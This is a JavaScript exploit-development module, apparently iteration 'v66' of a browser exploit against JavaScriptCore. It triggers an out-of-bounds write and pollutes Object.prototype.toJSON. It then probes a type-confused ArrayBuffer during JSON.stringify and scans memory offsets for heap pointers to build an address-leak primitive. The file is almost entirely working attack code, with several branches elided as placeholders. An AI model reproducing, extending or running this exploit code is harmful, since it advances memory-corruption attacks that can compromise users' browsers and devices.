// js/script3/testArrayBufferVictimCrash.mjs (v66_HandlePromiseConfusion)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC = "OriginalHeisenbug_TypedArrayAddrof_v66_HandlePromiseConfusion";

// Variáveis globais/módulo para captura de dados
let captured_fuzz_for_ConfusedAB_as_Promise_v66 = null;
let captured_fuzz_for_NormalDV_v66 = null;

let leak_target_confused_ab_v66 = null;
let leak_target_normal_dv_v66 = null;
let victim_typed_array_ref_v66 = null;
let probe_call_count_v66 = 0;
let all_probe_interaction_details_v66 = [];
let first_call_details_object_ref_v66 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V66 = 10;
const FUZZ_OFFSETS_V66 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_HandlePromiseConfusion_v66() {
    probe_call_count_v66++;
    const call_num = probe_call_count_v66;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v66),
        this_is_C1: (this === first_call_details_object_ref_v66 && first_call_details_object_ref_v66 !== null),
        this_is_ConfusedAB: (this === leak_target_confused_ab_v66 && leak_target_confused_ab_v66 !== null),
        this_is_NormalDV: (this === leak_target_normal_dv_v66 && leak_target_normal_dv_v66 !== null),
        fuzz_capture_info: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}. IsConfusedAB? ${current_call_details.this_is_ConfusedAB}. IsNormalDV? ${current_call_details.this_is_NormalDV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V66) { /* ... stop recursion ... */ }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Victim. Creating C1_details w/ payloads.`, "info");
            first_call_details_object_ref_v66 = current_call_details;
            if (leak_target_confused_ab_v66) current_call_details.payload_ConfusedAB = leak_target_confused_ab_v66;
            if (leak_target_normal_dv_v66) current_call_details.payload_NormalDV = leak_target_normal_dv_v66;
            all_probe_interaction_details_v66.push({...current_call_details});
            return current_call_details;
        }
        // NOVO CASO: 'this' é o ConfusedAB E seu tipo agora é [object Promise]
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object Promise]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB BUT TYPE IS [object Promise]! Fuzzing...`, "critical");
            let fuzzed_reads = [];
            try {
                // Como 'this' não é mais um ArrayBuffer, não podemos usar DataView(this) diretamente.
                // Esta é uma situação exploratória. A leitura de offsets aqui é altamente especulativa.
                // Se a estrutura subjacente ainda for similar a um objeto com campos, podemos ter sorte.
                // Para este teste, vamos assumir que ainda podemos tentar ler como se fosse um DataView genérico
                // (isso provavelmente vai falhar ou ler lixo, mas é para testar a hipótese)
                // Uma abordagem mais segura seria tentar obter seu backing buffer se fosse um TypedArray, mas Promise não tem.
                // Para fins de teste, vamos tentar criar um DataView sobre um ArrayBuffer fictício do mesmo tamanho
                // e ver se a type confusion permite ler algo do 'this' (Promise) real. Isso é improvável de funcionar.
                // A melhor aposta é se o 'this' (Promise) ainda tem uma estrutura de objeto acessível por offsets.
                // Por enquanto, vamos apenas logar que atingimos este estado e retornar um marcador.
                // O fuzzing direto em um objeto Promise sem saber sua estrutura interna é muito difícil.

                // Para este teste, vamos simplificar: apenas logamos e não tentamos fuzzing direto no Promise object
                // pois não temos como fazer DataView(this) se this é uma Promise.
                // O objetivo é confirmar se este estado é alcançável.
                current_call_details.fuzz_capture_info = "ConfusedAB became Promise. Fuzzing TBD.";
                 logS3(`[${current_call_details.probe_variant}] ConfusedAB as Promise. Fuzzing logic needs specific implementation for Promise internals.`, "warn");
                captured_fuzz_for_ConfusedAB_as_Promise_v66 = []; // Placeholder

                all_probe_interaction_details_v66.push({...current_call_details});
                return { marker_confused_ab_as_promise_v66: true, call_num_processed: call_num, observed_type: current_call_details.this_type };
            } catch (e) { /* ... error handling ... */ }
        }
        // Caso antigo: 'this' é o ConfusedAB E seu tipo é [object ArrayBuffer] (se a confusão para Promise não ocorrer)
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB (as ArrayBuffer)! Fuzzing...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this);
                for (const offset of FUZZ_OFFSETS_V66) { /* ... (lógica de fuzzing igual à v64) ... */
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(` ConfusedAB Fuzz@${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                }
                captured_fuzz_for_ConfusedAB_as_Promise_v66 = fuzzed_reads; // Usar o mesmo capturador por simplicidade
                current_call_details.fuzz_capture_info = `ConfusedAB (as AB) Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_info}`, "vuln");
                all_probe_interaction_details_v66.push({...current_call_details});
                return { marker_confused_ab_fuzz_done_v66: true, call_num_processed: call_num };
            } catch (e) { /* ... */ }
        }
        else if (current_call_details.this_is_NormalDV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS NormalDV! Fuzzing...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this;
                for (const offset of FUZZ_OFFSETS_V66) { /* ... (lógica de fuzzing igual à v64) ... */
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(` NormalDV Fuzz@${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                }
                captured_fuzz_for_NormalDV_v66 = fuzzed_reads;
                current_call_details.fuzz_capture_info = `NormalDV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_info}`, "vuln");
                all_probe_interaction_details_v66.push({...current_call_details});
                return { marker_normal_dv_fuzz_done_v66: true, call_num_processed: call_num };
            } catch (e) { /* ... */ }
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') { /* ... C1 re-entry ... */ }
        else { /* ... unexpected ... */ }

        all_probe_interaction_details_v66.push({...current_call_details});
        return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_HandlePromiseConfusion() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (HandlePromiseConfusion) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC} Init...`;

    // Resetar variáveis de captura e estado
    captured_fuzz_for_ConfusedAB_as_Promise_v66 = null;
    captured_fuzz_for_NormalDV_v66 = null;
    probe_call_count_v66 = 0;
    all_probe_interaction_details_v66 = [];
    victim_typed_array_ref_v66 = null;
    first_call_details_object_ref_v66 = null;

    let tempOriginalToJSON_getter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused ArrayBuffer do core_exploit...`, "info");
    leak_target_confused_ab_v66 = getStableConfusedArrayBuffer();
    if (tempOriginalToJSON_getter) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON_getter); else delete Object.prototype.toJSON;

    if (!leak_target_confused_ab_v66) {
        logS3(`[${FNAME_CURRENT_TEST}] FALHA AO OBTER Confused ArrayBuffer. Usando ArrayBuffer normal como fallback.`, "warn");
        leak_target_confused_ab_v66 = new ArrayBuffer(0x80); // Fallback para um AB normal
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] Confused ArrayBuffer obtido do core_exploit. Type: ${Object.prototype.toString.call(leak_target_confused_ab_v66)}`, "info");
    }
    leak_target_normal_dv_v66 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null, collected_probe_details = [];
    let addrof_A_result = { success: false, msg: "Addrof ConfusedAB: Default (v66)" };
    let addrof_B_result = { success: false, msg: "Addrof NormalDV: Default (v66)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: false }); // Não forçar reinit se getStableConfusedAB já o fez
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v66 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_HandlePromiseConfusion_v66, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v66)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v66);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info");
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing fuzz data from side-channels (v66)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;
            const process_fuzz = (fuzz_data, adr_res, typeName) => {
                // ... (Lógica de process_captured_fuzz_reads da v64, ajustada para v66 e com log mais claro)
                if (fuzz_data && Array.isArray(fuzz_data)) {
                    heisenbugIndication = true;
                    logS3(`  V66_ANALYSIS: Processing ${fuzz_data.length} captured fuzz reads for ${typeName}.`, "good");
                    for (const r of fuzz_data) {
                        if (r.error) continue;
                        const hV=parseInt(r.high,16), lV=parseInt(r.low,16);
                        let isPtr=false; if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);} if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;}
                        if(isPtr&&!(hV===0&&lV===0)){adr_res.success=true;adr_res.msg=`V66 SUCCESS (${typeName}): Ptr ${r.int64} @${r.offset}`;logS3(` !!!! V66 POINTER for ${typeName} @${r.offset}: ${r.int64} !!!!`,"vuln");break;}
                    }
                    if(!adr_res.success){adr_res.msg=`V66 Fuzz for ${typeName} no ptr. First: ${fuzz_data[0]?.int64||'N/A'}`;}
                } else if (!adr_res.success){adr_res.msg=`V66 No fuzz data for ${typeName}.`;}
            };
            process_fuzz(captured_fuzz_for_ConfusedAB_as_Promise_v66, addrof_A_result, "ConfusedAB(Promise?)");
            process_fuzz(captured_fuzz_for_NormalDV_v66, addrof_B_result, "NormalDV");

            if(!heisenbugIndication && first_call_details_object_ref_v66){ /* ... */ }
            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V66_HPC}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ }
        finally { if(pollutionApplied){ /* ... restore ... */ } }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        collected_probe_details = all_probe_interaction_details_v66.map(d=>({...d}));
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        // ... (logs finais e limpeza de globais)
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v66}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (ConfusedAB): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (NormalDV): Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        // Limpeza de globais da v66
        captured_fuzz_for_ConfusedAB_as_Promise_v66 = null;
        captured_fuzz_for_NormalDV_v66 = null;
        leak_target_confused_ab_v66 = null;
        leak_target_normal_dv_v66 = null;
        victim_typed_array_ref_v66 = null;
        probe_call_count_v66 = 0;
        all_probe_interaction_details_v66 = [];
        first_call_details_object_ref_v66 = null;
    }
    return { /* ... objeto de resultado ... */ };
};
